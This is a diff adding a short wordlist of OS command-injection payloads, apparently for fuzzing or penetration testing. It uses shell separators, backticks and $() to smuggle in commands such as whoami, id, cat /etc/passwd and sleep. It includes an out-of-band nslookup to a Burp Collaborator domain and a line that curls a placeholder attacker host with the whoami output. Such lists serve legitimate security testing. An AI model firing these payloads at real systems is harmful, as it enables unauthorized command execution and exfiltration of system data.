@@ -1,0 +1,32 @@
+; ls
+| ls
+|| ls
+& ls
+&& ls
+`ls`
+$(ls)
+; id
+| id
+; whoami
+| whoami
+; cat /etc/passwd
+| cat /etc/passwd
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+; echo INJECTED
+| echo INJECTED
+| nslookup burpcollaborator.net
+| curl http://attacker.com/$(whoami)
+%3B%20ls
+%7C%20ls
+| dir
+& whoami
+| ver
+; ls -la
+| ls -la
+$(id)
+`id`
+; ping -c 5 127.0.0.1
+| ping -n 5 127.0.0.1
